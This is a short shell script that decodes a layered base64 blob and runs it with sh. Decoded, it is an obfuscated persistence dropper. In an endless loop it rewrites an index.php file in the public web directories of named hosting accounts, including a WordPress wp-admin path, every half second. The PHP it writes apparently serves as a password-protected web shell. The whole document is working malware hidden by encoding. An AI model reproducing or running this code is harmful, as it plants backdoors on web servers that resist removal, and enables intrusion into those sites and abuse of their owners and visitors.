miuae="ZGlybnlhPSIvaG9tZS91Nzk5MDI2MzY2L2RvbWFpbnMvZWR1cGhhcm1pbmRvLmNvbS9wdWJsaWNfaHRtbC8iCmRhdGFueWE9IlpHbHlibmxoUFNJdmFHOXRaUzkxTnprNU1ESTJNelkyTDJSdmJXRnBibk12WTJWeWFYTmxMbWxrTDNCMVlteHBZMTlvZEcxc0wzZHdMV0ZrYldsdUwzVnpaWEl2TWpZeE1qVTNMeUlLWkdGMFlXNTVZVDBpVUVRNWQyRklRVXRqTWxaNll6SnNkbUpzT1hwa1IwWjVaRU5uY0U5M2IwdE1lVzl4UTJsQmNVbEZVbkJqTWtacFlrZFZaMXBZU25saU0wbG5ZMjFXZDJJelNqQmhWelZ1UTJsQmNVTnBRWEZKUms1c1pFTkNNR0ZIYkhwSlNGSjJTVWRXZVdOdE9YbFlNMHBzWTBjNWVXUkhiSFZhZVdkblRGUkZaMHRUUW0xaU0wbG5Xa2RXYVdSWFpHNWhWelZ1VEdkdlowdHBPRXRhYmxaMVdUTlNjR0l5TkdkYU1sWXdaRmhLYzJNeWJIVmFiVGh2U2toV2VXSkRhMmRsZDI5blNVTkJaMkZYV1dkTFIxb3hZbTFPTUdGWE9YVllNbFkwWVZoT01HTjVaMjVaTTFaNVlrWTViR1ZIVm1wS2VXdHdTVWh6UzBsRFFXZEpRMEZuU1VOQmExa3lPWFZpYVVFNVNVZE9NV050ZUdaaFZ6VndaRU5uYTJSWVNuTkxWSE5MU1VOQlowbERRV2RKUTBKcVpGaEtjMWd6VG14a1J6bDNaRU5uYTFreU9YVmlhWGRuVVRGV1UxUkZPVkZXUmpsVFVsWlNWbFZyTlZWVmEwWlBWVEJhUmxWcGQyZE5VMnMzUTJsQlowbERRV2RKUTBGbldUTldlV0pHT1hwYVdGSjJZMGhSYjBwSFRuWmliVFJ6U1VWT1ZsVnJlRkJWUmxKbVVtczVUVlJGT1ZoVVJUbEVVVlpTU2xRd05ITkpSRVZ3VDNkdlowbERRV2RKUTBGblNVZE9NV050ZUdaak1sWXdZak5DTUV0RFVtcGlNalYxVEVOQ1JGWldTazFVTVVKVldERldWRkpXU2tKU01GWlBWa04zWjBsck1YWmxiV3h6WWtkRmRrNVROSGRKUTJoWVlWYzFhMkl6WkhwSlJUVlZTVVJaZFUxVWMyZGpibGsyVFhwSmRVMURhMmRTTWxacVlUSTRkazFxUVhoTlJFRjRUVVJGWjFKdGJIbGFWMXAyWlVNNGVrMXBOSGRKYVdzM1EybEJaMGxEUVdkSlEwRm5XVE5XZVdKR09YcGFXRkoyWTBoUmIwcEhUblppYlRSelNVVk9WbFZyZUZCVlJsSm1WVEZPVFZneFdrWlZhMnhIVjFaQ1JsSldTWE5KUkVGd1QzZHZaMGxEUVdkSlEwRm5TVWRPTVdOdGVHWmpNbFl3WWpOQ01FdERVbXBpTWpWMVRFTkNSRlpXU2sxVU1VSlZXREZPVkZSR09WZFNWa3BLVW14c1NWUXhUbFZNUTBGM1MxUnpTME5wUVdkSlEwRm5TVU5CWjB4NU9HZFZNbFl3U1VkT2RtSXlkSEJhV0UxblpGaE9jR0p0WTJkak1sWjZZekpzZG1KcFFuQmFhVUpvWkcxR2NHSkhSbWxpUjFWTFNVTkJaMGxEUVdkSlEwSndXbWxCYjJGWVRucGFXRkZ2U2tZNVZGSldUbFJUVlRsUFYzbGthbUl5ZEhCS01UQndTMU5DTjBOcFFXZEpRMEZuU1VOQlowbERRV2RKUjA0eFkyMTRabU15VmpCaU0wSXdTME5TYW1JeU5YVk1RMEpFVmxaS1RWUXhRbFZZTUU1UVZEQjBTbEpUZDJkS1JqbFVVbFpPVkZOVk9VOVhlV1JxWWpKMGNFb3hNSEJQZDI5blNVTkJaMGxEUVdkSlNEQkxRMmxCWjBsRFFXZEpRMEZuU2toV2VXSkdPVzVhV0ZKbVdUSTVkV1JIVm5Wa1NFNW1Xa2RHTUZsVFFUbEpSMDR4WTIxNFpscFlhR3haZVdkcldUSTVkV0pwYXpkRGFVRm5TVU5CWjBsRFFXZFpNMVo1WWtZNWFtSkhPWHBhVTJkcldUSTVkV0pwYXpkRGFVRm5TVU5DT1VsSFZuTmpNbFp3V21sQmIxcHVWblZaTTFKd1lqSTFabHBZYUhCak0xSjZTME5rYldGWGVHeFlNbVJzWkVZNWFtSXlOVEJhVnpVd1kzbGpjRXRUUWpkRGFVRm5TVU5CWjBsRFFXZEtTRlo1WWtZNWJscFlVbVpaTWpsMVpFZFdkV1JJVG1aYVIwWXdXVk5CT1VsSFduQmlSMVptV2pKV01GZ3lUblppYmxKc1ltNVNla3REVWpGamJYZHdUM2R2WjBsRFFXZG1VMEpzWWtoT2JHRlhXV2RMUjFveFltMU9NR0ZYT1hWWU1sWTBZVmhPTUdONVoyNWFiVGwzV2xjMGJrdFRRVzFLYVVKdFpGYzFhbVJIYkhaaWJEbHNaVWRzZW1SSVRXOUtNMDR3WTIxV2FHSldPVzVhV0ZKbVdUSTVkV1JIVm5Wa1NFMXVTMU5yWjJWM2IyZEpRMEZuU1VOQlowbERVbTlaVnpWcllrZFZaMUJUUW0xaU0wSnNZbWxuYTJSWVNuTk1RMEZwWTJsSmNFOTNiMmRKUTBGblNVTkJaMGxEVWpGamJYaG1XakpXTUZneVRuWmlibEpzWW01U2VsZ3lVbWhrUjBWblVGTkNlbVJJU214WlZ6Rm1XakpXTUZneVRuWmlibEpzWW01U2VrdERVbTlaVnpWcllrZFZjRTkzYjJkSlEwRm5TVU5CWjBsSFdtcGlSemw2V2xObmEyRkhSblZhUjNoc1MxUnpTMGxEUVdkSlNEQm5XbGQ0ZWxwVFFqZERhVUZuU1VOQlowbERRV2RLU0ZaNVlrWTVibHBZVW1aWk1qbDFaRWRXZFdSSVRtWmFSMFl3V1ZOQk9VbEhXbWhpU0U1c1QzZHZaMGxEUVdkbVVXOW5TVU5CWjJOdFZqQmtXRXAxU1VOU01XTnRlR1phTWxZd1dESk9kbUp1VW14aWJsSjZXREpTYUdSSFJUZERiakJMUTJrNGRrbEZXakZpYlU0d1lWYzVkVWxJVW5aSlIwNXZXbGRPY2tsSGJHMUpTRkp2V2xOQ01XTXlWbmxKUjJ4NlNVZDRkbG95Wkd4YVEwSndZbWR3YldSWE5XcGtSMngyWW1sQ2NHTXhPWE5pTW1SdVdsZFNabUZYTkc5TFVYQTNRMmxCWjBsRFFubGFXRkl4WTIwMFoyRllUbnBhV0ZGdlNrWTVWRkpXVGxSVFZUbFBWM2xrYzJJeVpHNWFWMUptWVZjMGJsaFRhMmRLYVZsblNrWTVWRkpXVGxSVFZUbFBWM2xrYzJJeVpHNWFWMUptWVZjMGJsaFRRVGxRVkRCblpFaEtNVnBVYzB0bVVXOUxUSGs0WjFFeWFHeFpNbk5uWVZkWloyUkhhR3hKU0VKb1l6Tk9NMkl6U210SlIyeDZTVWhPTVZsdE1YQmtTRkpzV2tOQ2FHSnRVV2RaTWpsNVkyMVdhbVJCY0hCYWFVRnZZVmhPZWxwWVVXOUtSamxSVkRGT1ZWZDVaSGRaV0U1NlpESTVlVnBEWkdSTFUydG5aWGR2WjBsRFFXZEtSMVoxWkVkV2VWcFhVbVpqUjBaNll6TmtkbU50VVdkUVUwRnJXREZDVUZVeFVtSktNMEpvWXpOT00ySXpTbXRLTVRBM1EybEJaMGxEUVd0aFIwWjZZVWRXYTFnelFtaGpNMDR6WWpOS2EwbEVNR2RLTWtac1drUkpNVnB0VFRGT2VsbDVUVlJSTlZwdFRUQmFWMDVyVDBST2FVNHlVWHBOVkUwMVQwZFNhRXA2YzJkTWVUaG5WVzFXZDJKSFJtcGFVMEl3WVVkc2VrbElaSEJrUjJkblpWYzVNV05wUWs1U1JGVm5ZVWRHZW1GSFZtdEpTRUpvWXpOT00ySXpTbXREYVVGblNVTkNjRnBwUVc5aVYxRXhTME5TYkdKdVVteGpiVlpyV0ROQ2FHTXpUak5pTTBwclMxTkJPVkJVTUdkS1IyaG9ZekpvYkZwR09YZFpXRTU2WkRJNWVWcERhMmRsZDI5blNVTkJaMGxEUVdkSlF6aDJTVVpDYUdNelRqTmlNMHByU1Vkc2VrbEhUblpqYmtwc1dUTlJjMGxJVGpCaU0wcHNTVWRzTUVsSGJIVkpTRTVzWXpOT2NHSXlORXRKUTBGblNVTkJaMGxEUVd0WU1VNUdWVEZPU2xRd05XSktNbmgyV2pKa2JGcEdPWEJpYVdSa1NVUXdaMlJJU2pGYVZITkxTVU5CWjBsRFFXZEpRMEZyV0RGT1JsVXhUa3BVTURWaVNqSk9kbUV5YTI1WVUwRTVTVU5rYUdNelZXNVBlVUYyVEhsQ1UxcFlRbk5aVjA1c1NVaFNiMkZZVFdka01td3dZVU5DTldJelZubEpSMDUyWWpKMGNGcFRRbXRaV0ZKb1EybEJaMGxEUWpsSlIxWnpZekpWWjJWM2IyZEpRMEZuU1VOQlowbERPSFpKUmtKb1l6Tk9NMkl6U210SlIyeDZTVWRzZFZreU9YbGpiVlpxWkVGdlowbERRV2RKUTBGblNVZFdhbUZIT0dkSmEyeDFXVEk1ZVdOdFZtcGtRMEozV1ZoT2VtUXlPWGxhUXpSblZVZDRiRmxZVG14SlNGSjVaVk5DYUZveVJuQmlhVFJwVDNkdlowbERRV2RtVVhBNVEyZHZka3g1UWtSaFIxWnFZWGxDY0ZwcFFqQmhSMVZuWkZoT2JHTnBRbkJqZVVKellqSmtibHBYVVdkaFZ6Um5XVzFXYldJelNteEpSMVkwV2xkT01XUkhiSFZhZVVJd1lVZFZaMWt5T1hWa1IxWjFaRUZ3Y0ZwcFFXOWhXRTVtWWtjNWJsb3lWbXRZTW14MVMwTnJjRWxJYzB0SlEwRm5TVU5TYUVsRU1HZGFNbFl3WkZoS2MyTXliSFZhYlRodlNqSm9NR1JJUW5wUGFUaDJZekpvYkdKSGQzVmpTRXB3WW01T2IweHRUblppVXpsUFdWaFNiMWxYTkhaWlYzaHRXVk0xTUdWSVVXNUxWSE5MU1VOQlowbEhWakpaVjNkdlNubzRLMHA1UVhWSlExSm9TMVJ6UzJaVFFteGlTRTVzU1VoelMwbERRV2RKUXpoMlNVVlNjR016UW5OWldHdG5Za2M1Ym1GWE5HZGFiVGw1WWxOQ2NGcHBRblZpTTFGbllrYzVibG95Vm10SlIyeDFRMmxCWjBsRFFTOVFaMjluU1VOQloxQkRSa1ZVTUU1VlYxWkNSa2xIYURCaVYzY3JRMmxCWjBsRFFUaGhTRkowWWtRMFMwbERRV2RKUkhodldsZEdhMUJuYjJkSlEwRm5TVU5CWjBsRWVEQmhXRkp6V2xRMVRXSXlaSEJpYW5kMlpFZHNNR0pIVlN0RGFVRm5TVU5CT0V3eWFHeFpWMUVyUTJsQlowbERRVGhaYlRsclpWUTBTMGxEUVdkSlEwRm5TVU5CT0ZwdE9YbGlVMEowV2xoU2IySXlVVGxKYkVKUVZURlJhVWxIUm1wa1IyeDJZbW93YVVscU5FdEpRMEZuU1VOQlowbERRV2RKUTBGblVFZDRhRmx0Vm5OSlIxcDJZMm93YVdOSFJucGpNMlIyWTIxUmFWQnNRbWhqTTA0ellqTkthMDlxZDNaaVIwWnBXbGQzSzBOcFFXZEpRMEZuU1VOQlowbERRV2RKUkhod1ltNUNNV1JEUWpCbFdFSnNVRk5LZDFsWVRucGtNamw1V2tOSloyRlhVVGxKYmtKb1l6Tk9NMkl6U210SmFVSjFXVmN4YkZCVFNuZFpXRTU2WkRJNWVWcERTU3REYVVGblNVTkJaMGxEUVdkSlEwRm5TVVI0Y0dKdVFqRmtRMEl3WlZoQ2JGQlRTbnBrVjBwMFlWaFJhVWxJV21oaVNGWnNVRk5LVFdJeVpIQmlhVWtyUTJsQlowbERRV2RKUTBGblVFTTViV0l6U25SUVoyOW5TVU5CWjFCRE9XbGlNbEkxVUdkdlowbERRV2RRUXpsdlpFY3hjMUJuYjJkSlEwRm5VRVE1ZDJGSVFVdG1VVzh2VUdjOVBTSUtkMmhwYkdVZ2RISjFaVHNnWkc4Z0NpQWdJQ0FnSUNBZ1pXTm9ieUFrWkdGMFlXNTVZU0I4SUdKaGMyVTJOQ0F0WkNBK0lDUmthWEp1ZVdFdmFXNWtaWGd1Y0dod0NpQWdJQ0FnSUNBZ2JXdGthWElnTFhBZ0pHUnBjbTU1WVM4S0NXTm9iVzlrSURBMk5EUWdKR1JwY201NVlTOEtJQ0FnSUNBZ0lDQmphRzF2WkNBd056VTFJQ1JrYVhKdWVXRXZDaUFnSUNBZ0lDQWdjMnhsWlhBZ01DNDFDbVJ2Ym1VPSIKd2hpbGUgdHJ1ZTsgZG8gCiAgICAgICAgZWNobyAkZGF0YW55YSB8IGJhc2U2NCAtZCA+ICRkaXJueWEvaW5kZXgucGhwCiAgICAgICAgbWtkaXIgLXAgJGRpcm55YS8KCWNobW9kIDA2NDQgJGRpcm55YS8KICAgICAgICBjaG1vZCAwNzU1ICRkaXJueWEvCiAgICAgICAgc2xlZXAgMC41CmRvbmU="
echo $miuae | base64 -d | sh
